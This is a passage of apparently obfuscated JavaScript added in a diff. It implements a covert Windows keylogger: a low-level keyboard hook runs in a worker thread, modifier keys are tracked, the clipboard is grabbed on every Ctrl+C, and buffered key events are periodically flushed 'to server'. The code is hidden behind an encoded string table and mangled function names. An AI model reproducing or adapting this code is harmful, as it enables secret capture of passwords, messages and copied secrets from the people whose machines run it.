Mf2','mZiNlcb3','CfjWBxG','FdiWFdqW','yMvHDcbZ','Ege1lcbw','icPOv25K','C3qGEYbW','yw5dB2rL','igvYCIKG','zhvSzuHH','ksbTB2rZ','Aw50mtyG','ig9YihvU','icblzxLI','DMjNtNa','BLDtueu','B2mGpsaK','zNv3qw8','BgfIBgu','C1n2r1m','ywjLBa','A2XbrMq','igLMicHT','BM9dBwi','zMKVDxnL','DeHVB2Tf','s21mALO','C3rKB3v0','ywX0','t0Twy2W','kcDIB29S','zxjeyxrH','BhLHrgK','vfb0ANy','AuHhB2e','Eurqy2i','psbUzxCG','B25ZDcbT','EWOGignV','id0GzMfS','y2fSBcbp','tMfczM0','tw9KCYGP','CNvUBMLU','zxrdDxjY','r2v0s2v5','AMLrwxi','Aw5NlcbP','ChjVDg8O','x3n0zgnH','yxjLBNrq','tMTKEM4','icaNAw50','BcbFx3n0','wKrZC1i','Aw4GAgfU','BgWGtg93','y2HPBgrF','ywLUlxrO','C3rHCNrZ','B25ZDcb1','DMfSAwqG','kMHOAYKN','EuXmA2u','mICSihb0','mtyGkMXW','pt0Gj3n0','EenVDw50','C25pzxe','tu9ex0fm','BMqSihvP','z0LIwgO','oIbUCg0G','mIbJBgLW','mZiGAwru','ievoqujm','r2v0lunS','vYa9ihvZ','ywXRELe','B2jQzwn0','C2vYDMvY','y2f0Aw9U','Bgv0ihn0','CML0zs1p','C3nHz2vx','BgWGugvL','zwqGD29Y','zxjUzwWZ','AgSP','v1zlEgC','s3PyDu4','mIb3rMXH','icGKBMfT','jIyGzxjY','Ag9VAZOG','mZiUzNvU','yxbWzw5K','C05St28','CMrgB3jT','yw0P','cGOGihrY','t0j4Bvy','zfbYB2nq','oWOGignV','wwDgB0C','ih0PoWOk','ywLSywjS','sw5ZDgfS','oIaWlcb5','jhnOzwXS','tLrFsuqP','ihvUyxzH','qNLLr2e','s2HnqM4','kgLZuhjL','lI4UjW','t0LovcCS','DgnOicHL','qxv0BY1Z','AgvHCNrI','su5gtYaQ','zxjYia','BguGpsbt','CMDLicG','AKTlwNe','BKnSAxbI','q29KzsWG','Ag9ZDg5H','s1nuuLvd','yxvnAfi','CMvHzcbM','z3jVDw5K','zKj0t1K','id0GmdSk','yNPvqwu','ywXStMv4','mZiGDunV','zguSihvP','igLUDcbU','cIaGzwXZ','yxjdB2rL','zvCGpsb1','ksb7cIaG','AxrSzsKG','y2XPCgjV','A0v4vYHP','Bhf0veK','idGSieHp','BguODM9P','zsb3yxrJ','yxrPB24G','rvjst1iG','mZn8mtr8','Fdj8mZj8','BIbPC01V','rYaQBhbn','ihrOzsbH','zsaOCg9S','kMXWu3rY','zxjsB3v0','ifvZzxiG','DxjL','BgLWyM9H','ihrYEsb7','kICSig1L','BYH1Aw50','vML3rhe','CM5HBwu','C3mUzxHP','C3rVCa','BK5HBwu','v2LUmte','zwq6','lcbFt3v0','Dcbhzxrd','DhjPBMDD','B25ZDcb2','khrOCMvH','n3W1Fdn8','r1jgDKO','zxHPDa','CMvSzwfZ','ywXPEMLU','B2z0ifrL','ksaQieHp','ihDszw1V','ifzlx1jd','BIb1CgrH','zsKGEYbx','zwn0zwqS','yxjHBsK','zw50lI4U','vLjhrKu','zw0P','vMLZDwfS','DcbJB25U','ignVBNrL','ifzlx0Xn','yxrPB24','rfLXsuS','cIaGlwWS','ChrYjYWG','CIbJyxb0','DfbVCNqU','AxrSzq','v2LUzg93','C3bSAxq','B3f6ANa','AvrQyxy','uK9mksbT','BNrqB3j0','ihrOzsbZ','ywrqCM9J','rxjYB3iG','x19ZDgrJ','yKfyufO','q0Lrs1O','DgLUzYb0','A2v5ihrV','y2fSBcbd','DcbMywLS','mxWXoq','s19dqvbj','B25ZDcbY','ideGoIaW','ndu0mLj6zxjdzW','ifzlx0nb','oWOGigHV','yML0CYKG','zun0CMXi','vefmksaM','C2XPy2u','icH2AYa9','idb4ytm7','zMKUBg9H','wNncAwW','idaPoWOG','r2vUsg4','AYKPihSk','vefmksbT','B2LUDa','D29YA2vY','zxnZlMv4','lcb1Aw50','AwnVzguO','yMfSvw5S','B2rZq2fW','ifzlx1jn','y2fSBcbe','BM93','BMTmrKe','zxH0tgvU','B29RrxGO','ignVBNn0','ANmGw29W','kgXqyxjH','BNqTAwqG','x3rOCMvH','Dg9ju09t','uMvJB25U','C0LKkq','Fdm5FdmW','DcbJB21T','BMCP','oIaWlcbW','sxLZDeW','y3rPDMu6','EMTIqwG','DdOGj3jL','yw5KBgvY','y2XPzw50','s2v5yM9H','AwyGkcfT','mZiGy2XP','AxnZAw5N','CK1PBIWG','DMvYihn0','z2uGpYbL','B2LUDgvY','DxjYzw50','DeTLEvn0','tv9rvuLu','AYa9igTI','Axj0s2v5','DxjLoNn0','AxjIwe0','yxjKigLZ','uwjdtKG','rM9YBwf0','yxjKuhjV','psaWlcbT','ruqk','zsaRideP','y3rYBa','lcbnt0rF','mJv8nNW0','zYbRzxLI','ig1VBML0','BsWGDM9P','D3niB29R','C3rLCG','v2L0Aa','AxjeDMO','psbIAxrZ','CxvLC3q','icDJyxb0','C3mGq3rY','ksWGC2vU','reTht1y','BMCGBwfP','s3rLCMu','ic0TC2vY','Ag9VAYb3','DgvnB2qO','C3nHz2uO','DgjLyxq6','CxnLq2C','DcbdywXS','yxjKigzH','CMvWBgfJ','zcaKzg9J','Aw4GjhnO','mtyYoJq0','ls13Aw4T','ienOCM9T','DgePigjP','Bw9KC0fS','DJSkicbL','ih0Gy2f0','vxnLCIbj','Bgvxid0G','vurpy28','BurLrKe','DgfYDgLU','tM90zxbH','icaGqwDL','EgL0kdeP','CML0zsaT','Ce51Eem','BgjHy2Ts','zMzPlMXV','y2vZCYH1','vvDytu0','BwvZC2fN','zxH0vYH2','icHUq29K','C3qGr2v0','ywL0igzV','rKTby0m','zcaQAfDU','AuvAtue','DgLVBNnD','EwvZ','igLUigHV','EgeYlcbw','AhnHBvO','qKz3u2K','psbws19m','tcb8Fcb2','DxrMoa','y2fSBcbt','zvDMEgC','Dw5YzwDP','zYbMB3iG','igLUC3rH','vca9idb4','Dcb3B3jR','weHxq0e','DNbeChG','q0fquYa9','oYb1C2LU','igL0ihj1','idaSig1V','yxj0','C2nHBIWG','ywXSihr5','ig1HAw4G','u2vSzI5q','zsH7ihq6','seLgvdSk','Fdf8n3WY','B2LKicPO','ue9jtLq','AxnuvfK','Agfjs3a','z2DLzc1P','mJC2ntrjq3vzqvK','Aw5N','q2fWDhvY','CgLUzWOG','BNqGAwri','B3DmzxzL','psb1C2vY','AYa9pq','ywDLzd0','lcbUq29K','ywWGy2XP','ANrLrM8','uMvJzwL2','AwX0zxjn','t0ncD0q','BwuPcIaG','Bwf4','zwfYCYb0','y29UBMvJ','ig1ZzYaH','B29SiefK','CwLmseS','zxLIB2fY','mte4ndnRyxvJvgy','mJqTyMy3','yM9HCMqG','CLH1uuO','icbJB25Z','ksWGy3vY','ruWGicaG','yxjNDG','BgvKjYb9','nIaQBhbn','A2v5lwfN','B25ZDcbx','x1jdt05u','Eej5wha','D0zSywDZ','y2HHCKf0','vsb8Fcb2','tK5Swg4','mZiNlcb0','ihSkicaG','rgf0ysaM','BgWGr2XV','ihDnC2Dg','CgjVyxjK','BNqZmIb3','ndb4A0Tusgi','v2LSBcbH','uKvdva','ug93zxjq','BgWGu2v0','DMvFy29U','vfjptca9','ufrJuwO','y2vZC0LK','zxjYAwrL','AhDUzefJ','ihn0B3bW','igLMicHY','BMfTzq','y01Szu8','BgWGqxr0','A2vYoIaN','j2vYCICS','BMrVD3ni','ihW9ie1p','rZOGv2LU','sePmuuu','B2r1Bgvi','t3HssuW','AKHNuxC','lMrSBcCP','Aw50mZiG','z2vxkhvP','Dg9YAw5N','zMKk','t0nYu0m','AKPSshO','u2v0v2LU','icaGigLM','zsaOA29M','vxbXsLO','CMqGy2fW','ugDwrvy','vfz1AvG','CMqGyMfJ','AgfUz2vK','qxbWBgLJ','suzuihX8','ihDwAxj0','zfbYB2mO','DhjPBq','BfLpqw0','CKnHC2u','DgHLigXV','if9FC3rK','s2jAr0e','z1rwyLe','BYbdB2rL','icHTB2rZ','DxjLig9U','mxWYn3WZ','D1nJyw5d','AweSidaS','BJSkicaG','DKv5t3G','sMHbCg8','uLnXCMu','BIbKzxnR','u1rsvunu','psbxtv9t','CNiPihSk','psbws19s','psbhzxrn','yw5KBguG','C2uGAwyG','n2yYns0Y','AxrZihW9','nda5nJSk','zNrLCIbJ','C3rYAwn0','s19nru5v','zcaTuMf3','tKfXBMe','icbtzxj2','ignHChr1','Aw50if9F','cIaGlxmS','DgfYDcbJ','igLMicH2','C3PHt2e','DwLUDhb0','AfDoD3a','swqPjWOP','B2TfEcH2','CY5SB2fK','BcbRB2zM','Bcbhzxrx','AhDUzezV','BJSkicbP','DwHxveC','Esb7cIaG','y2vFDxnL','zsWGx0LU','DhrHy2Hu','DMvnC2CP','B3b5ig9W','qvbjvefm','BcCPoWPJ','BMmOj2LU','Aw5NigXH','mtz8mZv8','C2CP','BgfIBguO','vNPyr0u','igzHAwXL','Dhb0CIb3','BgWGA29M','wunMqKe','BwfJt1m','ihSkicbJ','y29UDgvU','q3vYC29Y','AK5VD0G','CY5LEgL0','u0fcihjP','t3DUzxiP','DxnLCIbZ','ufLfy2y','z2vxkf9p','lcbLoIbt','CJOG','u2vYDMvY','CgXHDgzV','zNjVBunO','B25ZDcbR','A2v5oMjH','uMvNAxn0','Cgf0y2Hn','zgXLid0G','DgXLoYbI','BMCGA2v5','Exf6Cum','B2fYzcbJ','BKj5uKW','icaGierP','ktSkicbJ','DwLUDdmY','zdOG','ktSkFsbJ','Ew5J','y2vZCY5L','kMHOAYWG','zcbxAw4Z','AwqGkMHx','pt09ic0X','Bfnytg8','vMX4B3m','icGKzg9J','CMfTksb7','CMqGu3LU','CLDqwwC','C3nHz2u','EhDPAui','tgv2zwXl','B25PDg9Y','tfvYEhK','vgL0Bgu','z014uwe','yM9HCMre','zwfKsw5W','nNWWFdf8','AgvSBa','s1rbvgu','pt0Gj29I','z2HrvgS','zxjYB3i','ENDZt2u','id09psbw','DxfsEKu','DhiGD1bH','rKXqswq','vMHqrNO','AxjLkcDR','Bcb3AxrO','zcaQAe1V','oWOGicaG','quzuELe','mhW0mxWX','zxiUlI4','z1rAuMe','x1jjtKDF','ywiPihSk','AwqGkMHn','B2fYzcH2','zgLZy29U','Aw50ChrY','y2uGlsbR','BgLZDgvU','C2fNzvCO','zM9YzwfJ','vu9hCK8','A2vYicSG','oWP9ignH','xIyQka','Aw5NigfN','u2vZC2LV','BKLotMq','sg9VAYb3','DLzrueW','rg1uywq','DcbUvMLY','ChvZAa','pt0GvKTF','vcb8Fcb2','t3v0xYbn','B3n0vgHY','z2v1thC','A2v5y2HH','cGPMDw5J','uMfjC1G','ufLNCg8','zwfKigzH','C2fIid0G','icbPzIaO','BhnLigLM','EeXPuuO','id0Gw3n0','id0GDxnL','ug9ZDfrO','ks4UlG','oWOGihjL','B21Py3mU','id0GAxnq','ExzWwhe','BgWSig1L','CM9JktSk','yxvesxK','zwXSlLDP','cID1C2uG','iokaLcbKCM8','ihbYB2nL','Aw9UswqO','ihj1BM5P','Aw9Y','EWOGicaG','u0v4Ahy','mI5MDw5J','tMfTzvCO','Bg9HzcHP','j3vPBNqZ','DxrVlxn0','ihn0B3aU','BurltLG','Bxb0EsbH','yM9VBcbF','zMKGBM90','vgHYzwfK','oWOGief0','FsK7cIaG','zxjYjYWG','CxHgEgq','Aw5KB3CO','ihSGEdOG','B3DZsg9V','C3nMDwXS','mta0oWPJ','C29Szt0','tfHUs0O','zYKGpt4G','lcaTlxrV','oIaNDwLU','igu6icDT','igvSC2uG','BMrVD3mU','ChjVDg8','icaGFqOG','v0T1DvO','CKzQDfy','DgvUDa','B2XKzxiP','psboDw1I','svrbtcKG','CMfTktSk','y2HHCG','ktSkicbP','j2LUDdmY','vYHJB25Z','CeXzq08','B2TfEfCG','id0GA29M','t09lu1rs','ihvZzxiZ','Ccb0BYa','ANnpuey','q1LWywe','BMCGC3rV','EYbxCML0','BgWGq2XV','Dhb0CIbF','v0fstKLo','Aw5ZDgfU','if9jBM91','igXHC3qG','Dhj5ihSG','CMvUDdOG','BhrLCK1H','zuHbD0e','rgvSAxzL','lM9UkcDT','cIaGlY8G','DxqGkfTZ','A01LC3nH','q29UBMvJ','C2LVBL9S','CMvHze1L','kdePoWP9','wKz0tLm','zxrnB2r1','Aw51zsb9','v2fPDgLU','lMrSBa','BMHLCML0','BwvUDa','kqOGic10','A2v5zg93','A0HxBvy','DxnLCJmY','tvPWr2u','EvzruNa','vunujYWG','zhzPDMW','D24UlI4','yxrbDMfP','ls10B2TL','y3vXtfO','Bg93lwXL','zvHZAMO','BgLUDxG','icaGicbx','DcbZzw5K','qwX0id0G','y3rYBeTL','DMS7cIaG','jYb9ktSk','yxbwAxj0','ENj2qMe','igj1zMzL','yxj0icG','lI4U','C2CSihzV','reXmse9p','id0Gq2fS','DcKGyML0','zIaOkcH3','lNbVC3rn','Bwv0yq','ktSkicaG','C01LDgeG','Aw50ig5d','zufvEKq','ieLUAxrP','DMvUDcHZ','yw5KBguP','BMrVD3mO'];
+a0e0=function(){
+return dO;
+}
+;
+return a0e0();
+}
+function sn(){
+const DY=a0eX,DN=a0eX,e0={
+'BFwSi':function(e1){
+return e1();
+}
+,'OxRIL':function(e1,e2,e3){
+return e1(e2,e3);
+}
+,'JXvmb':function(e1,e2){
+return e1*e2;
+}
+,'eTjZb':function(e1,e2){
+return e1===e2;
+}
+}
+;
+if(st)return;
+st=e0.OxRIL(setInterval,()=>{
+const DA=DY,DC=DY;
+if(J)return;
+try{
+const e1=e0.BFwSi(ln);
+if(e1)console.log('DEBUG: Flushed '+e1+(' key event(s)\x20to\x20server'));
+}
+catch(e2){
+console.log('Error in\x20key flush loop:\x20'+e2.message);
+}
+}
+,e0.JXvmb(c,0x3e8));
+if(e0.eTjZb(typeof st.unref,'function'))st.unref();
+}
+function cn(){
+const Dw=a0eX,Di=a0eX,e0={
+'alkzQ':function(e1){
+return e1();
+}
+,'FpZRM':function(e1,e2,e3){
+return e1(e2,e3);
+}
+}
+;
+if(tt)return;
+e0.alkzQ(Le),rt=e0.FpZRM(setTimeout,()=>{
+const Dx=Dw;
+an().catch(e1=>{
+const DG=Dx,DH=Dx;
+console.log('ERROR in handle_copy_operation:\x20'+e1.message);
+}
+);
+}
+,0x96);
+}
+async function an(){
+const DV=a0ey,Dm=a0ey,e0={
+'vbgNp':'DEBUG: handle_copy_operation called','GjxLj':function(e1,e2){
+return e1<e2;
+}
+,'NNlXn':function(e1,e2){
+return e1>e2;
+}
+,'IXnYI':function(e1,e2){
+return e1-e2;
+}
+,'hWNwp':function(e1,e2){
+return e1(e2);
+}
+,'itIKX':function(e1){
+return e1();
+}
+,'bOVcc':'(empty)','fTsAn':function(e1,e2){
+return e1+e2;
+}
+}
+;
+console.log(e0.vbgNp);
+if(tt)return;
+try{
+let e1='';
+const e2=[0x64,0xc8,0x15e,0x1f4,0x2ee,0x3e8];
+let e3=0x0;
+for(let e4=0x0;
+e0.GjxLj(e4,e2.length);
+e4++){
+const e5=e2[e4]-(e0.NNlXn(e4,0x0)?e2[e0.IXnYI(e4,0x1)]:0x0);
+await e0.hWNwp(de,e5),e3=e2[e4],e1=e0.itIKX(Ke);
+const e6=e1?e1.slice(0x0,0x32):e0.bOVcc;
+console.log('DEBUG: Attempt '+(e4+0x1)+(' after\x20')+e3+('ms\x20-\x20Clipboa'+"rd: '")+e6+("' (len"+'gth:\x20')+e1.length+')');
+if(e1&&e1.trim()){
+console.log('✓ Captured\x20clipboard on attempt\x20'+e0.fTsAn(e4,0x1)+'\x20('+e1.length+('\x20chars)'));
+break;
+}
+}
+e1&&e1.trim()?e0.hWNwp(Oe,e1):console.log('⚠ Warning: Clipboard\x20appears to be empty after copy operation');
+}
+finally{
+rt=null;
+}
+}
+function un(e0,e1,e2,e3){
+const DS=a0eX,DR=a0eX,e4={
+'mWzde':function(e8,e9){
+return e8(e9);
+}
+,'irDvj':function(e8,e9){
+return e8===e9;
+}
+,'haIKp':function(e8,e9,eD,eP,ed){
+return e8(e9,eD,eP,ed);
+}
+,'hVkRg':function(e8){
+return e8();
+}
+,'KiIPc':function(e8,e9){
+return e8(e9);
+}
+}
+;
+if(!Z)return;
+const e5=e3||ht;
+if(e4.mWzde(Je,e0)){
+!e3&&en(e0,e1);
+return;
+}
+if(!e1)return;
+const e6=e4.irDvj(e0,0x43)&&(e5.ctrl||e5.meta);
+if((e5.ctrl||e5.alt||e5.meta)&&!e6)return;
+const e7=e4.haIKp(nn,e0,!![],e2,e5);
+Object.assign(e7,e4.hVkRg(ke));
+if(on(e7))return;
+e4.KiIPc(rn,e7);
+if(e6)e4.hVkRg(cn);
+}
+let fn=0x0,dn=null,pn=null,gn=![],hn=null;
+const mn=0x1,_n=0x12,wn=0x8,kn=0x4,vn=0x1000,bn=0x1,yn=0x2,Cn=0x4,Mn=0x8,Tn=0x10;
+let In=null;
+const Sn=[],Wn=0xfa0;
+let Pn=![];
+function En(){
+const P0=a0eX,P1=a0eX,e0={
+'aUTCV':function(e3,e4){
+return e3*e4;
+}
+,'CIQKZ':function(e3,e4){
+return e3+e4;
+}
+}
+,e1=new SharedArrayBuffer(e0.aUTCV(e0.CIQKZ(wn,vn*kn),0x4)),e2=new Int32Array(e1);
+return Atomics.store(e2,0x0,0x0),Atomics.store(e2,0x1,0x0),Atomics.store(e2,0x2,0x1),{
+'sab':e1,'view':e2}
+;
+}
+function Kn(e0){
+const P2=a0ey,P3=a0ey;
+let e1=0x0;
+if(e0.alt)e1|=bn;
+if(e0.ctrl)e1|=yn;
+if(e0.shift)e1|=Cn;
+if(e0.meta)e1|=Mn;
+if(e0.caps)e1|=Tn;
+return e1;
+}
+function On(e0){
+const P4=a0eX,P5=a0eX,e1={
+'RRILh':function(e2,e3){
+return e2(e3);
+}
+,'yVQRp':function(e2,e3){
+return e2&e3;
+}
+,'RWpIZ':function(e2,e3){
+return e2&e3;
+}
+,'sQvgm':function(e2,e3){
+return e2(e3);
+}
+}
+;
+return{
+'alt':e1.RRILh(Boolean,e0&bn),'ctrl':Boolean(e1.yVQRp(e0,yn)),'shift':e1.RRILh(Boolean,e1.RWpIZ(e0,Cn)),'meta':e1.sQvgm(Boolean,e1.yVQRp(e0,Mn)),'caps':e1.RRILh(Boolean,e1.yVQRp(e0,Tn))}
+;
+}
+function An(){
+const P6=a0eX,e0={
+'ZFtNS':function(e1){
+return e1();
+}
+,'eXsjj':function(e1,e2){
+return e1(e2);
+}
+}
+;
+if(Pn)return;
+Pn=!![],e0.eXsjj(setImmediate,()=>{
+const P7=P6;
+Pn=![],e0.ZFtNS(Ln);
+}
+);
+}
+function Ln(){
+const P8=a0ey,P9=a0ey,e0={
+'Wquei':function(e2,e3){
+return e2<e3;
+}
+}
+;
+if(!Sn.length)return;
+const e1=Sn.splice(0x0,Sn.length);
+for(let e2=0x0;
+e0.Wquei(e2,e1.length);
+e2++){
+const e3=e1[e2];
+try{
+un(e3.vkCode,!![],e3.scanCode,e3.mods);
+}
+catch(e4){
+}
+}
+}
+function Nn(e0,e1,e2){
+const PD=a0eX,PP=a0eX,e3={
+'pNuxC':function(e4,e5){
+return e4>=e5;
+}
+,'KAjdC':function(e4){
+return e4();
+}
+}
+;
+e3.pNuxC(Sn.length,Wn)&&Sn.shift(),Sn.push({
+'vkCode':e0,'scanCode':e1,'mods':e2}
+),e3.KAjdC(An);
+}
+function $n(){
+const Pd=a0eX,Pc=a0eX,e0={
+'NnssR':function(e5,e6){
+return e5!==e6;
+}
+,'iHGoa':function(e5,e6){
+return e5<e6;
+}
+,'HRqFT':function(e5,e6){
+return e5+e6;
+}
+,'wXDeK':function(e5,e6){
+return e5*e6;
+}
+,'OKVcl':function(e5,e6){
+return e5+e6;
+}
+,'cdVcK':function(e5,e6,e7,e8){
+return e5(e6,e7,e8);
+}
+,'yxRpV':function(e5,e6){
+return e5(e6);
+}
+}
+;
+if(!In||!In.view)return;
+const e1=In.view;
+let e2=Atomics.load(e1,0x1);
+const e3=Atomics.load(e1,0x0);
+let e4=0x0;
+while(e0.NnssR(e2,e3)&&e0.iHGoa(e4,vn)){
+const e5=e0.HRqFT(wn,e0.wXDeK(e2%vn,kn)),e6=e1[e5],e7=e1[e0.HRqFT(e5,0x1)],e8=e1[e0.HRqFT(e5,0x2)];
+e2=e0.OKVcl(e2,0x1)>>>0x0,e4+=0x1,e0.cdVcK(Nn,e6,e7,e0.yxRpV(On,e8));
+}
+e4&&Atomics.store(e1,0x1,e2);
+}
+function xn(){
+const PB=a0ey,Py=a0ey,e0={
+'ByeGa':function(e1){
+return e1();
+}
+,'ihfXj':function(e1,e2){
+return e1===e2;
+}
+,'YgFoG':'function'}
+;
+if(hn)return;
+hn=setInterval(()=>{
+const PX=PB;
+e0.ByeGa($n);
+}
+,0x1);
+if(e0.ihfXj(typeof hn.unref,e0.YgFoG))hn.unref();
+}
+function Dn(){
+const e0={
+'qyZqa':function(e1,e2){
+return e1(e2);
+}
+}
+;
+hn&&(e0.qyZqa(clearInterval,hn),hn=null);
+}
+function Gn(){
+const Pz=a0ey,Pb=a0ey;
+return "\n'use "+'strict\x27;
+\x0aconst {
+ parentPort, workerData }
+ = require(\x27worker_threads\x27);
+\x0alet\x20koffi;
+\x0atry {
+\n  koffi = requ'+"ire('k"+'offi\x27);
+\n}
+ catch (err) {
+\n\x20\x20parentPort.postMessage({
+ t: '+"'err',"+'\x20e:\x20\x27koffi missing in hook wor'+"ker: '"+'\x20+\x20err.message }
+);
+\n  process.exit(1);
+\n}
+\n\nconst\x20WH_KEYBOARD_LL = 13;
+\x0aconst WM_KEYDOWN\x20=\x200x0100;
+\nconst WM_SYSKEYDOWN\x20=\x200x0104;
+\nconst\x20WM_QUIT\x20=\x200x0012;
+\x0aconst\x20VK_SHIFT = 0x10, VK_CONTROL = 0x11, VK_MENU\x20=\x200x12;
+\nconst\x20VK_LSHIFT = 0xa0,\x20VK_RSHIFT = 0xa1, VK_LCONTROL = 0xa2, VK_RCONTROL = 0xa3;
+\nconst VK_LMENU = 0xa4,\x20VK_RMENU = 0xa5, VK_LWIN = 0x5b, VK_RWIN = 0x5c, VK_CAPITAL\x20= 0x14;
+\nconst HOOK_RING_META = 8, HOOK_SLOT\x20=\x204, HOOK_CAP = 4096;
+\nconst\x20MOD_ALT = 1, MOD_CTRL\x20=\x202, MOD_SHIFT\x20=\x204,\x20MOD_META\x20=\x208, MOD_CAPS =\x2016;
+\x0a\x0aconst sab = workerData &&\x20workerData.sab;
+\nif (!sab) {
+\n  parentPort.postMessage({
+ t: '+"'err',"+" e: 'm"+'issing SharedArrayBuffer'+"' }
+);
+\n"+'  process.exit(1);
+\n}
+\nconst\x20ia\x20= new Int32Array(sab);
+\n\nconst\x20user32 = koffi.loa'+"d('use"+'r32.dl'+"l');
+\nc"+'onst kernel32 = koffi.lo'+"ad('ke"+'rnel32'+".dll')"+';
+\nconst KB'+('DLLHOOKSTRUCT\x20=\x20koffi.struct(\x27KBDLLHOOKSTR'+"UCT', "+'{
+\n  vkCode: '+"'uint3"+"2', sc"+'anCode'+": 'uin"+"t32', "+'flags:\x20\x27uint'+"32', t"+'ime:\x20\x27uint32'+"', dwE"+'xtraIn'+"fo: 'u"+'intptr\x27,\x0a}
+);
+\nconst POINT = koffi.str'+"uct('P"+"OINT',"+' {
+ x: '+"'int32"+"', y: "+"'int32"+'\x27\x20}
+);
+\x0aconst MSG = koffi.struct(\x27MSG\x27, {
+\n  hwnd:\x20'+"'void "+"*', me"+'ssage:'+" 'uint"+"32', w"+'Param:'+" 'uint"+'ptr\x27,\x20lParam'+": 'int"+"ptr', "+'time:\x20'+"'uint3"+"2', pt"+': POINT,\x0a}
+);
+\x0aconst LowLevelKeyboardProc = koffi.proto('+"\n  'in"+'tptr __stdcall LowLevelKeyboardProc(int nCode, uintptr wParam, void *lParam)\x27\x0a);
+\nconst LowLevelKeyboardProcPtr\x20=\x20koffi.pointer(LowLevelKeyboardProc);
+\nconst SetWindowsHookExW = user32.fun'+"c(\n  '"+'void * __stdcall SetWindowsHookExW(int idHook,\x20LowLevelKeyboardProc\x20*lpfn,\x20void *hMod, uint32 dwThread'+"Id)'\n)"+';
+\nconst CallNextHookEx = user32.func'+"(\n  'i"+'ntptr\x20__stdcall CallNextHookEx(void *hhk, int nCode,\x20uintptr wParam,\x20void *lPa'+"ram)'\n"+');
+\nconst UnhookWindowsHookEx = user32.func'+"('bool"+' __stdcall UnhookWindowsHookEx(void\x20'+"*hhk)'"+');
+\nconst GetMessageW = user32.func(\n'+"  'int"+' __stdcall\x20GetMessageW(_Out_ MSG *lpMsg,')+(' void *hWnd,\x20uint32\x20wMsgFilterMin, uint32 wMsgFilterMax)\x27\x0a);
+\nconst TranslateMessage\x20= user32.fun'+"c('boo"+'l __stdcall TranslateMessage(const MSG\x20*lpMsg)\x27);
+\nconst DispatchMessageW = user32.fu'+"nc('in"+'tptr __stdcall DispatchMessageW(const\x20MSG\x20*lpMsg'+")');
+\nc"+'onst GetKeyState\x20=\x20user32.func'+"('int1"+'6 __stdcall GetKeyState(int nVirtKey'+")');
+\nc"+'onst GetModuleHandleW = kernel32.fun'+"c('voi"+'d\x20*\x20__stdcall GetModuleHandleW(const uint16 *lpModuleName)\x27);
+\nconst GetCurrentThreadId\x20=\x20kernel32.func'+"('uint"+'32\x20__stdcall\x20GetCurrentThreadI'+"d()');
+"+'\nconst\x20PostThreadMessageW = user32.func(\x0a\x20'+" 'bool"+' __stdcall PostThreadMessageW(uint32\x20idThread,\x20uint32 Msg,\x20uintptr wParam, intptr\x20lParam)\x27\x0a);
+\x0a\x0alet modsAlt = 0, modsCtrl = 0, modsShift = 0, modsMeta = 0, modsCaps = 0;
+\x0alet\x20hookHandle = null;
+\x0alet stopping = false;
+\n\nfunction isMod(vk) {
+\n  return vk === VK_MENU || vk === VK_LMENU || vk === VK_RMENU\x0a\x20\x20  || vk\x20===\x20VK_CONTROL\x20|| vk === VK_LCONTROL || vk === VK_RCONTROL\x0a\x20\x20\x20\x20|| vk === VK_SHIFT\x20||\x20vk\x20=== VK_LSHIFT || vk === VK_RSHIFT\x0a\x20\x20  || vk ==')+('= VK_LWIN\x20|| vk === VK_RWIN || vk ===\x20VK_CAPITAL;
+\x0a}
+\x0a\x0afunction updateMod(vk, isPress) {
+\n  const v = isPress ?\x201\x20:\x200;
+\n  if (vk ===\x20VK_MENU || vk ===\x20VK_LMENU ||\x20vk\x20=== VK_RMENU) modsAlt = v;
+\n  else if (vk === VK_CONTROL || vk === VK_LCONTROL || vk === VK_RCONTROL) modsCtrl = v;
+\n  else if (vk\x20=== VK_SHIFT || vk === VK_LSHIFT || vk === VK_RSHIFT)\x20modsShift\x20=\x20v;
+\x0a\x20\x20else if (vk === VK_LWIN || vk === VK_RWIN) modsMeta =\x20v;
+\x0a\x20 else if\x20(vk === VK_CAPITAL) modsCaps = (GetKeyState(VK_CAPITAL) & 1) ? 1\x20:\x200;
+\x0a}
+\x0a\x0afunction\x20packMods() {
+\x0a\x20\x20let bits = 0;
+\n  if (modsAlt) bits\x20|=\x20MOD_ALT;
+\n  if (modsCtrl) bits |= MOD_CTRL;
+\n  if (modsShift)\x20bits |= MOD_SHIFT;
+\n  if (modsMeta) bits\x20|=\x20MOD_META;
+\n  if (modsCaps) bits |= MOD_CAPS;
+\n  return\x20bits;
+\n}
+\n\nfunction ringPush(vk,\x20scan, bits) {
+\n  const write = Atomics.load(ia, 0);
+\n  const\x20read\x20=\x20Atomics.load(ia,\x201);
+\n  if (((write - read)\x20>>>\x200)\x20>=\x20HOOK_CAP)\x20return;
+\x20//\x20full — drop\x20capture only,\x20never stall typing\n  const base = HOOK_RING_META\x20+ (write\x20%\x20HOOK_CAP) * HOOK_SLOT;
+\n ')+(' ia[base]\x20=\x20vk;
+\n  ia[base + 1] = scan;
+\n  ia[base + 2] = bits;
+\n  Atomics.store(ia, 0,\x20(write + 1)\x20>>>\x200);
+\n}
+\n\nfunction\x20hookProc(nCode,\x20wParam, lParam) {
+\n  // Deliver the key to the system FIRST\x20—\x20this is what fixes\x20local lag / dropped chars.\n  const next = CallNextHookEx(hookHandle || null, nCode, wParam, lParam);
+\x0a\x20\x20if (nCode\x20>=\x200 && Atomics.load(ia, 2) === 1) {
+\n    try {
+\x0a\x20\x20\x20\x20\x20\x20const\x20kb\x20=\x20koffi.decode(lParam, KBDLLHOOKSTRUCT);
+\n      const wp = Number(wParam);
+\n      const isPress = wp\x20===\x20WM_KEYDOWN\x20||\x20wp\x20=== WM_SYSKEYDOWN;
+\n \x20\x20\x20\x20\x20const vk = kb.vkCode\x20|\x200;
+\x0a\x20\x20\x20\x20\x20 if (isMod(vk)) {
+\n        updateMod(vk,\x20isPress);
+\n    \x20\x20}
+\x20else if (isPress)\x20{
+\x0a        ringPush(vk, kb.scanCode | 0, packMods());
+\n      }
+\n    }
+ catch (_)\x20{
+}
+\x0a\x20\x20}
+\x0a\x20\x20return next;
+\x0a}
+\x0a\x0atry {
+\n  modsCaps\x20=\x20(GetKeyState(VK_CAPITAL) & 1) ? 1 : 0;
+\n  const callbackRef\x20=\x20koffi.register(hookProc, LowLevelKeyboardProcPtr);
+\n  const moduleHandle = GetModuleHandleW(null);
+\n  hookHandle = SetWindowsHookExW(WH_KEYBOARD_LL, callbackRef,\x20moduleHandle, 0);
+\n')+('\x20\x20if\x20(!hookHandle) {
+\n   \x20parentPort.postMessage('+"{
+ t: '"+"err', "+"e: 'Se"+'tWindowsHookEx fai'+"led' }
+"+');
+\n    process.exit(1);
+\n  }
